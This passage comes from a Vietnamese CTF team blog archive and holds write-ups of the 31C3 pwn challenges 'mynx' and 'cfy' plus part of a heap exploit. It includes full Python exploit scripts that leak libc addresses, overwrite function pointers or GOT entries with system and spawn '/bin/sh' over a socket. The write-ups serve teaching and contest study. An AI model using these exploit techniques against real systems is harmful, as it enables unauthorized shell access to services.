+<p><img class="alignnone" src="https://i2.wp.com/3.bp.blogspot.com/_B6yuuJdg78o/TRzylm315aI/AAAAAAAAAKk/KKU-be6yPlI/s1600/image018.jpg?resize=458%2C92&#038;ssl=1" alt="" width="458" height="92" data-recalc-dims="1" /></p>
+<p>Vùng nhớ tổ chức trong mem như sau (tạo 2 block với data size = 16:</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111248AM_zpsca72a939.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111248AM_zpsca72a939.png?resize=604%2C197" alt="" width="604" height="197" data-recalc-dims="1" /></a></p>
+<p>Gồm 3 block: block head được khởi tạo mặc định khi chạy chương trình.</p>
+<p>Để ý phần data của block được cấp phát là 1 đoạn đằng sau block, tôi sẽ đề cập sau ở phần khai thác lỗi.</p>
+<h5><strong>Phân tích hàm edit</strong></h5>
+<p>Nhập name,và size, hàm sẽ duyệt qua linked list để tìm ra block có tên tương ứng, và cập nhật lại phần data.</p>
+<p>Để ý phần sau:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111102AM_zpse1ead7c3.png?resize=604%2C299" alt="" width="604" height="299" data-recalc-dims="1" /></p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111018AM_zps6288871d.png?resize=604%2C176" alt="" width="604" height="176" data-recalc-dims="1" /></p>
+<p>Chương trình đọc từ stdin vào data <strong>nbytes</strong>, mà nbytes không check length.</p>
+<p>Nếu tạo 2 block liền nihau thì, phần tiếp theo phần data của block 1 là block2 nên ta có thể overwrite được cái block 2.</p>
+<h5><strong>Phân tích hàm get:</strong></h5>
+<p>Nhập vào tên block và size, tìm ra block tương ứng, in phần data ra màn hình, free vùng data và block, cập nhật lại linked list. Để ý <strong>write(1,node-&gt;data,n); mình sẽ dùng nó để leak addr</strong></p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111000AM_zpsc4f6c36a.png?resize=604%2C197" alt="" width="604" height="197" data-recalc-dims="1" /></p>
+<h4>Khai thác lỗi.</h4>
+<p>Ở đây mình sẽ overwrite địa chỉ <strong>data</strong> bằng địa chỉ của một hàm trong bảng got bằng cách lợi dụng phần <strong>read(0,node-&gt;data,node-&gt;size)</strong></p>
+<p>Để ý hàm free(node-&gt;data) nhận input là phần data nhập vào, ý tưởng là overwrite free trong bảng got là system và ta có, system(node-&gt;data).</p>
+<p>Payload của mình làm theo các bước như sau:</p>
+<ol>
+<li>Tạo ra 2 block <strong>peter123,lol123</strong> với data size của mỗi block là 16 bytes</li>
+<li>edit block<strong> peter123</strong>: với size 56, 'D'*28 + '\x00' * 16 + 'CCCC', với CCCC =&gt; địa chỉ hàm free, sở dĩ mình padd '\x00'*16 byte để làm name của block2 = 'DDDD'.</li>
+<li>edit block 2 ('DDDD') với size 4 bytes để ghi đè free trong bảng got ở đây mình ghi đè got bằng địa chỉ của lệnh ret, mục đích là để bypass qua hàm free, vì mình lợi dụng lệnh ret để leak 1 địa chỉ trong bảng GOT.</li>
+<li>get block 2('DDDD') minh sẽ leak được 1 địa chỉ trong bảng GOT, từ đó tính được địa chỉ hàm system.</li>
+<li>Tạo tiếp 2 block bất kì (<strong>b1,b2</strong>) với data size của mỗi block là 16 bytes</li>
+<li>edit block1('b1') ghi đè địa chỉ data của block 2 bằng địa chỉ free một lần nữa</li>
+<li>edit block2() để ghi đè free bằng system.</li>
+<li>Tạo ra block 'shell' với phần data='/bin/sh'</li>
+<li>get block('shell') và boom đã có được shell</li>
+</ol>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-11at30525AM_zps9153b11c.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-11at30525AM_zps9153b11c.png?resize=604%2C326" alt="" width="604" height="326" data-recalc-dims="1" /></a></p>
+<p><a href="https://i1.wp.com/i289.photobucket.com/albums/ll229/danh_st/johncena.gif"><img src="https://i1.wp.com/i289.photobucket.com/albums/ll229/danh_st/johncena.gif?resize=312%2C176" alt="" width="312" height="176" data-recalc-dims="1" /></a></p>
+<p>Payload: http://pastebin.com/n2G30Fk4</p>
+	</div><!-- .entry-content -->
+	
+	<footer class="entry-meta">
+		
+			</footer><!-- .entry-meta -->
+</article><!-- #post -->
+							
+<article id="post-229" class="post-229 post type-post status-publish format-standard hentry category-pwn">
+	<header class="entry-header">
+		
+				<h1 class="entry-title">
+			<a href="write-up-31c3-mynx.html" rel="bookmark">[Write up] 31C3 mynx</a>
+		</h1>
+		
+		<div class="entry-meta">
+			<span class="date"><a href="write-up-31c3-mynx.html" title="Permalink to [Write up] 31C3 mynx" rel="bookmark"><time class="entry-date" datetime="2015-01-03T10:01:27+00:00">January 3, 2015</time></a></span><span class="categories-links"><a href="../../category/pwn/index.html" rel="category tag">pwn</a></span><span class="author vcard"><a class="url fn n" href="../../author/peternguyen/index.html" title="View all posts by peternguyen" rel="author">peternguyen</a></span>					</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+		<div class="entry-content">
+		<p>Đây là một bài khá hay, mình phải mấy mấy tiếng đồng hồ để phân tích code.</p>
+<p>Đầu tiên chương trình tổ chức bộ nhớ, cấp phát như sau:</p>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80513PM_zps8cb11523.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80513PM_zps8cb11523.png?resize=604%2C229" alt="" width="604" height="229" data-recalc-dims="1" /></a></p>
+<p>Cấp phát 1 vùng nhớ 0x1000 bytes đầu tiên, và set 4 byte kế tiếp là length &lt;địa chỉ vùng nhớ&gt;&lt;độ dài phần tử&gt;(1)</p>
+<p>Vùng nhớ 0x1000 bytes này được chia nhỏ ra 16 phần, 1 phần là 256 bytes.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80606PM_zpsc221f81d.png?resize=604%2C198" alt="" width="604" height="198" data-recalc-dims="1" /></p>
+<p>Nếu vùng nhớ 0x1000 bytes này hết , chương trình sẽ tạo 1 vùng nhớ khác tiếp theo như (1)</p>
+<p>Cấu trúc của một ascii art được phân bố như sau:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80632PM_zps39c04618.png?resize=604%2C149" alt="" width="604" height="149" data-recalc-dims="1" /></p>
+<pre class="lang:c decode:true">struct ascii_art{
+     char tag; // tag của ascii_art có giá trị bằng 'I'
+     int id;
+     void (*filter)(char* content);
+     char content[247];
+};</pre>
+<p>Cấu trúc của một comment được phân bố như sau:</p>
+<p><a href="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80645PM_zps60860a85.png"><img src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80645PM_zps60860a85.png?resize=604%2C104" alt="" width="604" height="104" data-recalc-dims="1" /></a></p>
+<pre class="lang:c decode:true">struct comment{
+    char tag; // tag có giá trị bằng '7'
+    int id;
+    char content[251];
+}</pre>
+<p>Xem xét đoạn mã sau:</p>
+<p><img class="alignnone" src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80625PM_zps3f35d054.png?resize=604%2C83" alt="" width="604" height="83" data-recalc-dims="1" /></p>
+<p>Sau khi tạo 1 block comment, chương trình đọc vào vùng content với giá trị là 252 bytes (lố 1 byte) dựa vào đây mình sẽ khai thác được lỗi, ghi đè giá trị tag của block kế, biến block comment -&gt; block ascii art, từ đó fake được filterfunc.</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80916PM_zps2f85890b.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80916PM_zps2f85890b.png?resize=604%2C337" alt="" width="604" height="337" data-recalc-dims="1" /></a></p>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81442PM_zpse2e136b0.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81442PM_zpse2e136b0.png?resize=604%2C132" alt="" width="604" height="132" data-recalc-dims="1" /></a></p>
+<p>đoạn mã trên dùng để trigger bug khi biến block comment -&gt; block ascii art</p>
+<p>Các khai thác lỗi:</p>
+<pre class="lang:default decode:true">Tạo 1 block ascii art, tạo 2 block comment cho block ascii 1 , tạo block ascii art 2
++----------------------+
+|  Ascii Block 1       |
++----------------------+
+|  comment 1(1)        |
++----------------------+
+|  comment 2(1)        |
++----------------------+
+|  Ascii Block 2       |
++----------------------+
+
+Xóa hết comment block 1, tạo lại comment cho block 1 và block 2, dùng comment block 2, overwrite giá trị tag của Ascii Block 2 thành comment, dùng comment block 1 để overwrite comment block 2 thì Ascii Block 2
+
++----------------------+
+|  Ascii Block 1       |
++----------------------+
+|  comment 1(1)        |
++----------------------+
+|  comment 1(2)        |
++----------------------+
+|  Ascii Block 2       |
++----------------------+
+
+Trạng thái cần đạt được
+
++--------------------------------+
+|  Ascii Block 1                 |
++--------------------------------+
+|  comment 1(1)                  |
++--------------------------------+
+|  comment 2(1),block 2 fake     |
++--------------------------------+
+|  Ascii Block 2, comment 2 fake |
++--------------------------------+
+
+</pre>
+<p>Trigger bug và ta có</p>
+<p><a href="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81310PM_zps714162e4.png"><img src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81310PM_zps714162e4.png?resize=604%2C458" alt="" width="604" height="458" data-recalc-dims="1" /></a></p>
+<p>Do mình có thể control được filter_func và content, cho nên mình sẽ dùng printf và fmt để leak được địa chỉ __libc_main_start ở trên stack, từ đó tính được địa chỉ của hàm system</p>
+<p>Payload:</p>
+<pre class="lang:python decode:true  ">import socket
+from struct import *
+import telnetlib
+
+#+------------------+
+#|	Ascii Block 1 	|
+#+------------------+
+#|	comment 1 		|
+#+------------------+
+#|	comment 2 		|
+#+------------------+
+#|	Ascii Block 2 	|
+#+------------------+
+
+def connect(host,port):
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,port))
+	return s
+
+def add_ascii_block(s,block):
+	s.send('1\n')
+	s.recv(1024)
+	s.recv(1024)
+	s.send('1\n')
+	s.recv(1024)
+	s.send(block)
+
+def add_comment_block(s,block):
+	s.send('1\n')
+	s.recv(1024)
+	s.send(block)
+
+def select_block_id(s,block_id):
+	s.send('3\n') # select
+	s.recv(1024)
+	s.recv(1024)
+	s.send(str(block_id) + '\n')
+	s.recv(1024)
+	s.recv(1024) # comment menu
+
+def back_to_main_menu(s):
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	s.send('0\n') # back
+	s.recv(1024) # main menu
+	s.recv(1024)
+
+def leak_mem(s):
+	__libc_main = 0
+	fmt = '%p'*22 + '%s'
+	payload = pack('&lt;I',0x8048420) # printf
+	payload+= fmt + 'A'*(0xfb - 4 - len(fmt)) + '7'
+
+	s.recv(1024) # banner
+	s.recv(1024) # main menu
+	add_ascii_block(s,'A'*0xf6 + '\n') # add ascii block
+	s.recv(1024)
+	s.recv(1024) # main menu
+	select_block_id(s,1)
+	add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+	back_to_main_menu(s)
+	add_ascii_block(s,'B'*0xf6 + '\n')
+	s.recv(1024)
+	s.recv(1024) # main menu
+	select_block_id(s,1)
+	s.send('2\n') # remove all comments of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'D'*0xfb + '\n') # add comment of block 1
+	back_to_main_menu(s)
+	# add comment to block 2, change ascii block 2 into comment block 2
+	select_block_id(s,2)
+	add_comment_block(s,payload)
+	back_to_main_menu(s)
+	select_block_id(s,1)
+	# change 1st comment of block 2 into block 2
+	s.send('2\n') # remove all comments of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'A'*0xfb + 'I') # mark that comment 1 of block 2 is block 2
+	back_to_main_menu(s)
+	select_block_id(s,2)
+	s.send('3\n') # trigger bug
+	d = s.recv(1024)
+	if '\xf7' in d:
+		index = d.index('\xf7')
+		__libc_main = d[index - 3:index + 1]
+		__libc_main = unpack('&lt;I',__libc_main)[0]
+	s.send('0\n') # back
+	s.recv(1024) 
+	s.recv(1024) # main menu
+	return __libc_main
+
+def exploit():
+	s = connect('188.40.18.80',1234)
+	__libc_main = leak_mem(s)
+	offset = 149824 # Ubuntu 14.10
+
+	if (__libc_main &amp; 0xf7000000) == 0xf7000000:
+		system_addr = __libc_main + offset
+
+		cmd = '/bin/sh\x00'
+
+		payload = pack('&lt;I',system_addr)
+		payload+= cmd + 'A'*(0xfb - 4 - len(cmd)) + '7'
+		print '[!!!] System(): ',hex(system_addr)
+
+		add_ascii_block(s,'A'*0xf6 + '\n') # add ascii block
+		s.recv(1024)
+		s.recv(1024) # main menu
+		select_block_id(s,3)
+		add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+		back_to_main_menu(s)
+		add_ascii_block(s,'B'*0xf6 + '\n')
+		s.recv(1024)
+		s.recv(1024) # main menu
+		select_block_id(s,3)
+		s.send('2\n') # remove all comments of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'D'*0xfb + '\n') # add comment of block 1
+		back_to_main_menu(s)
+		# add comment to block 2, change ascii block 2 into comment block 2
+		select_block_id(s,4)
+		add_comment_block(s,payload) # real payload
+		back_to_main_menu(s)
+		select_block_id(s,3)
+		# change 1st comment of block 2 into block 2
+		s.send('2\n') # remove all comments of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'A'*0xfb + 'I') # mark that comment 1 of block 2 is block 2
+		back_to_main_menu(s)
+		select_block_id(s,4)
+		s.send('3\n') # trigger bug
+		print '[!!!] Shell is comming'
+		# interact socket with stdin,stdout
+		t = telnetlib.Telnet()
+		t.sock = s
+		t.interact()
+
+exploit()</pre>
+	</div><!-- .entry-content -->
+	
+	<footer class="entry-meta">
+		
+			</footer><!-- .entry-meta -->
+</article><!-- #post -->
+							
+<article id="post-227" class="post-227 post type-post status-publish format-standard hentry category-pwn">
+	<header class="entry-header">
+		
+				<h1 class="entry-title">
+			<a href="write-up-31c3-cfy.html" rel="bookmark">[Write Up] 31C3 cfy</a>
+		</h1>
+		
+		<div class="entry-meta">
+			<span class="date"><a href="write-up-31c3-cfy.html" title="Permalink to [Write Up] 31C3 cfy" rel="bookmark"><time class="entry-date" datetime="2015-01-03T10:00:35+00:00">January 3, 2015</time></a></span><span class="categories-links"><a href="../../category/pwn/index.html" rel="category tag">pwn</a></span><span class="author vcard"><a class="url fn n" href="../../author/peternguyen/index.html" title="View all posts by peternguyen" rel="author">peternguyen</a></span>					</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+		<div class="entry-content">
+		<p>Chạy chương trình, hiện ra 1 menu:</p>
+<pre class="lang:default decode:true">What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit</pre>
+<p>Chương trình parse input option vào như sau :</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101738AM_zps0db0c6e5.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101738AM_zps0db0c6e5.png?resize=604%2C346" alt="" width="604" height="346" data-recalc-dims="1" /></a></p>
+<p>option người dùng nhận vào ở <strong>rbp-0xc</strong></p>
+<p>&nbsp;</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101756AM_zps82fd6b1e.png?resize=604%2C145" alt="" width="604" height="145" data-recalc-dims="1" /></p>
+<p>Kiểm tra giá trị<strong> rbp-0xc</strong> nếu bằng 3 thì thoát.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101819AM_zps71f3f5cc.png?resize=604%2C398" alt="" width="604" height="398" data-recalc-dims="1" /></p>
+<p>Nhận input người dung vào địa chỉ <strong>0x6010e0</strong> dùng option mà người dụng chọn tính ra hàm tương ứng cần gọi (<strong>0x601080</strong> lưu địa chỉ các hàm : fromhex,fromdec,fromptr)</p>
+<pre class="lang:default decode:true">rax = (long *)0x601080[$(rbp-c)]; mov rdi,0x6010e0; call eax;
+</pre>
+<p>để ý lúc kiểm tra option nhập vào trương trình chỉ kiểm tra đk $(rbp-0xc) != 3 thì sẽ execute đoạn trên. Để ý địa chỉ input lớn hơn địa chỉ lưu trữ các hàm, nếu nhập input &gt; 3 thì ta sẽ có : <strong>0x601080 + $(rbp-0xc)*8 </strong>với 1 giá trị x của <strong>$(rbp-0xc)</strong> thì eax sẽ trỏ tới input của mình và mình có thể kiếm soát đc call eax.</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at102146AM_zps22cbdb58.png?resize=604%2C483" alt="" width="604" height="483" data-recalc-dims="1" /></p>
+<p>Ngoài ra, hàm fromptr có thể cho phép mình đọc bất kỳ vùng nhớ nào.</p>
+<p>Payload sẽ là:</p>
+<p>- dùng hàm fromptr để leak địa chỉ 1 hàm trong libc, dự đoán phiên bản libc đang chạy trên server (ở đây là ubuntu 14.10) , có offset từ hàm đó đến system</p>
+<p>- sử dụng bug trên để eax=system, và argv = /bin/sh</p>
+<pre class="lang:python decode:true  ">import socket
+from struct import *
+import telnetlib
+# 116064
+# Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
+def connect(host,port):
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,port))
+	return s
+
+def build_payload(system_addr):
+	shell = '/bin/sh\x00'
+	buff_addr = 0x6010e0
+	func_addr = 0x601080
+
+	payload = shell + '\x00'*8
+	jmp_offset = 6 + (len(payload) &gt;&gt; 4)
+	payload += pack('&lt;Q',system_addr) + '\n'
+
+	return (jmp_offset,payload)
+
+def exploit():
+	offset = 179728
+
+	s = connect('188.40.18.73',3313)
+	s.recv(1024) # banner
+	# leak libc addr
+	s.send('2\n')
+	s.recv(1024)
+	s.send(pack('&lt;Q',0x601018) + '\n') # puts@got
+	leak_addr_str = s.recv(1024).split('\n')
+	leak_addr = int(leak_addr_str[1].replace('hex: ',''),16)
+
+	system_addr = leak_addr - offset
+	print '[+] system():',hex(system_addr)
+	jmp_offset,payload = build_payload(system_addr)
+	# send payload
+	s.recv(1024)
+	s.send(str(jmp_offset) + '\n')
+	s.recv(1024)
+	s.send(payload)
+
+	# interact socket with stdin,stdout
+	t = telnetlib.Telnet()
+	t.sock = s
+	t.interact()
+
+exploit()</pre>
+	</div><!-- .entry-content -->
+	
+	<footer class="entry-meta">
+		
+			</footer><!-- .entry-meta -->
+</article><!-- #post -->
+							
+<article id="post-203" class="post-203 post type-post status-publish format-standard hentry category-uncategorized">
+	<header class="entry-header">
+		
+				<h1 class="entry-title">
+			<a href="01/welcome-to-babyphd/index.html" rel="bookmark">Welcome to BabyPhD!</a>
+		</h1>
+		
+		<div class="entry-meta">
+			<span class="date"><a href="01/welcome-to-babyphd/index.html" title="Permalink to Welcome to BabyPhD!" rel="bookmark"><time class="entry-date" datetime="2015-01-01T14:15:26+00:00">January 1, 2015</time></a></span><span class="categories-links"><a href="../../category/uncategorized/index.html" rel="category tag">Uncategorized</a></span><span class="author vcard"><a class="url fn n" href="../../author/chuymichxinhdep/index.html" title="View all posts by chuymichxinhdep" rel="author">chuymichxinhdep</a></span>					</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+		<div class="entry-content">
+		<p style="text-align: right;"><em>Đôi lúc tôi hay một mình</em></p>
+<p style="text-align: right;"><em>Tự hỏi rằng đời này có bao nhiêu ngày vui*</em></p>
+<p>&nbsp;</p>
+<p>Các trang blog CTF nói chung thường có hiện tượng bong bóng như kiểu nhà đất Việt Nam thập niên hai ngàn. Ất min ban đầu mới lập cũng chịu khó đầu tư. Dần dần cơm áo gạo tiền và đủ thứ vớ vẩn sinh chán. Thêm nữa hậu duệ kém không kế tục được sự nghiệp nên hỏng cả. Thời còn mông muội, dân tình vào chơi ngõ hầu muốn được cái gì đó nhưng dần dà blog CTF đã không đáp ứng được với thời cuộc. Ngay đến cả thằng đầu xỏ ất min cũng bỏ mẹ qua facebook cầm kiếm nhựa chém nhau. Ấy vậy mà BabyPhD chúng tôi vẫn mạnh dạn mở blog CTF writeup. Ở xã hội thấy thịnh thì phù mà thấy suy thì nhổ có được những thánh thần rơi rớt lại những tính túy cuối cùng của các tay <em>hacker</em> mũ trắng thật là tự thấy mừng cho cộng đồng IT Việt vậy.</p>
+<p>Để mở đầu cho chương trình nghệ thuật tấn công đến đâu viết lại tới đấy, chia sẻ chút kiến thức còm cõi cho đồng đạo security, chúng tôi xin hân hạnh khai trương blog BabyPhD với các thành viên trụ cột sau:</p>
+<ul>
+<li>chuymichxinhdep: đã xinh đẹp lại còn học thức &lt;3</li>
+<li>yeuchimse: lời ít tình chi thít</li>
+<li>peternguyen: anh hùng thời loạn</li>
+<li>justcallmedude: gay kín không tên</li>
+<li>antibkav: loại già có vợ nên luôn là thành viên bỏ đi của team, vớt vát cho nó phong phú</li>
+<li>huyna: hiệp sĩ thoắt ẩn thoắt hiện, chỉ thấy xi nhan khi có bài pwn</li>
+<li>chim: geohot của nhóm</li>
+</ul>
+<p>(Một vài thành viên khác xin giấu tên, số thành viên liên tục cập nhật nếu các bạn apply tại  <a href="https://www.facebook.com/babyphd.team">đây</a>)</p>
+<p>&nbsp;</p>
+<p>Xin chào thân ái và quyết thắng</p>
+<p>- Chụy Mích</p>
+<p>*Đời có bao nhiêu ngày vui - st:Châu Đăng Khoa</p>
+	</div><!-- .entry-content -->
+	
+	<footer class="entry-meta">
+		
+			</footer><!-- .entry-meta -->
+</article><!-- #post -->
+			
+			
+		
+		</div><!-- #content -->
+	</div><!-- #primary -->
+
+	<div id="tertiary" class="sidebar-container" role="complementary">
+		<div class="sidebar-inner">
+			<div class="widget-area">
+						<aside id="recent-posts-6" class="widget widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
+											<li>
+					<a href="../../2018/08/01/meepwn-ctf-2018-meepwn-contract/index.html">MEEPWN CTF 2018 - meepwn contract</a>
+									</li>
+											<li>
+					<a href="../../2018/07/17/meepwn-ctf-2018-xss/index.html">MEEPWN CTF 2018 - XSS</a>
+									</li>
+											<li>
+					<a href="../../2018/07/17/meepwn-ctf-2018-pycalx2/index.html">MEEPWN CTF 2018 - PyCalx2</a>
+									</li>
+											<li>
+					<a href="../../2017/08/10/wtf-is-safefinderoperatormac-campaign/index.html">What is SafeFinder/OperatorMac campaign?</a>
+									</li>
+											<li>
+					<a href="../../2017/07/27/meepwnctf-2017-injection/index.html">MeepwnCTF 2017 - injection</a>
+									</li>
+					</ul>
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">justcallmedude</span> on <a href="../../2016/11/24/hackyou-ctf-su-2016/index.html#comment-8120">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">zun</span> on <a href="../../2016/11/24/hackyou-ctf-su-2016/index.html#comment-7474">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">Tony</span> on <a href="../../2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/index.html#comment-7218">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</a></li><li class="recentcomments"><span class="comment-author-link">john</span> on <a href="../../2016/09/11/whitehat-contest-11-pwn400/index.html#comment-7211">Whitehat Contest 12 - Pwn400</a></li><li class="recentcomments"><span class="comment-author-link"><a href='../../index.html' rel='external nofollow' class='url'>chuymichxinhdep</a></span> on <a href="../../2016/09/11/whitehat-contest-11-pwn400/index.html#comment-7210">Whitehat Contest 12 - Pwn400</a></li></ul></aside><aside id="archives-3" class="widget widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
+				<li><a href='../../2018/08/index.html'>August 2018</a></li>
+	<li><a href='../../2018/07/index.html'>July 2018</a></li>
+	<li><a href='../../2017/08/index.html'>August 2017</a></li>
+	<li><a href='../../2017/07/index.html'>July 2017</a></li>
+	<li><a href='../../2017/05/index.html'>May 2017</a></li>
+	<li><a href='../../2016/11/index.html'>November 2016</a></li>
+	<li><a href='../../2016/09/index.html'>September 2016</a></li>
+	<li><a href='../../2016/07/index.html'>July 2016</a></li>
+	<li><a href='../../2016/04/index.html'>April 2016</a></li>
+	<li><a href='../../2016/03/index.html'>March 2016</a></li>
+	<li><a href='../10/index.html'>October 2015</a></li>
+	<li><a href='../09/index.html'>September 2015</a></li>
+	<li><a href='../05/index.html'>May 2015</a></li>
+	<li><a href='../04/index.html'>April 2015</a></li>
+	<li><a href='../02/index.html'>February 2015</a></li>
+	<li><a href='index.html'>January 2015</a></li>
+		</ul>
+			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
+				<li class="cat-item cat-item-32"><a href="../../category/chuymich/index.html">chuymich</a>
+</li>
+	<li class="cat-item cat-item-18"><a href="../../category/crypto/index.html">crypto</a>
+</li>
+	<li class="cat-item cat-item-31"><a href="../../category/forensic/index.html">forensic</a>
+</li>
+	<li class="cat-item cat-item-15"><a href="../../category/misc/index.html">misc</a>
+</li>
+	<li class="cat-item cat-item-25"><a href="../../category/pwn/index.html">pwn</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="../../category/re/index.html">re</a>
+</li>
+	<li class="cat-item cat-item-38"><a href="../../category/research/index.html">research</a>
+</li>
+	<li class="cat-item cat-item-47"><a href="../../category/smartcontract/index.html">smartcontract</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="../../category/uncategorized/index.html">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="../../category/vietnamese/index.html">vietnamese</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="../../category/web/index.html">web</a>
+</li>
+	<li class="cat-item cat-item-30"><a href="../../category/whitehat/index.html">whitehat</a>
+</li>
+		</ul>
+			</aside><aside id="tag_cloud-3" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="../../tag/2015/index.html" class="tag-cloud-link tag-link-36 tag-link-position-1" style="font-size: 8pt;" aria-label="2015 (1 item)">2015</a>
+<a href="../../tag/babyphd/index.html" class="tag-cloud-link tag-link-35 tag-link-position-2" style="font-size: 8pt;" aria-label="babyphd (1 item)">babyphd</a>
+<a href="../../tag/backdoorctf/index.html" class="tag-cloud-link tag-link-33 tag-link-position-3" style="font-size: 8pt;" aria-label="backdoorCTF (1 item)">backdoorCTF</a>
+<a href="../../tag/crypto/index.html" class="tag-cloud-link tag-link-14 tag-link-position-4" style="font-size: 22pt;" aria-label="crypto (3 items)">crypto</a>
+<a href="../../tag/css/index.html" class="tag-cloud-link tag-link-42 tag-link-position-5" style="font-size: 8pt;" aria-label="css (1 item)">css</a>
+<a href="../../tag/gaylord/index.html" class="tag-cloud-link tag-link-34 tag-link-position-6" style="font-size: 8pt;" aria-label="gaylord (1 item)">gaylord</a>
+<a href="../../tag/heap/index.html" class="tag-cloud-link tag-link-37 tag-link-position-7" style="font-size: 8pt;" aria-label="heap (1 item)">heap</a>
+<a href="../../tag/list-linked/index.html" class="tag-cloud-link tag-link-28 tag-link-position-8" style="font-size: 8pt;" aria-label="list-linked (1 item)">list-linked</a>
+<a href="../../tag/malware/index.html" class="tag-cloud-link tag-link-43 tag-link-position-9" style="font-size: 8pt;" aria-label="malware (1 item)">malware</a>
+<a href="../../tag/mughthesec/index.html" class="tag-cloud-link tag-link-45 tag-link-position-10" style="font-size: 8pt;" aria-label="Mughthesec (1 item)">Mughthesec</a>
+<a href="../../tag/operatormac/index.html" class="tag-cloud-link tag-link-44 tag-link-position-11" style="font-size: 8pt;" aria-label="OperatorMac (1 item)">OperatorMac</a>
+<a href="../../tag/pwn/index.html" class="tag-cloud-link tag-link-27 tag-link-position-12" style="font-size: 8pt;" aria-label="pwn (1 item)">pwn</a>
+<a href="../../tag/re/index.html" class="tag-cloud-link tag-link-26 tag-link-position-13" style="font-size: 8pt;" aria-label="re (1 item)">re</a>
+<a href="../../tag/side-channel/index.html" class="tag-cloud-link tag-link-29 tag-link-position-14" style="font-size: 8pt;" aria-label="side-channel (1 item)">side-channel</a>
+<a href="../../tag/sqli/index.html" class="tag-cloud-link tag-link-41 tag-link-position-15" style="font-size: 8pt;" aria-label="sqli (1 item)">sqli</a>
+<a href="../../tag/unserialize/index.html" class="tag-cloud-link tag-link-40 tag-link-position-16" style="font-size: 8pt;" aria-label="unserialize (1 item)">unserialize</a>
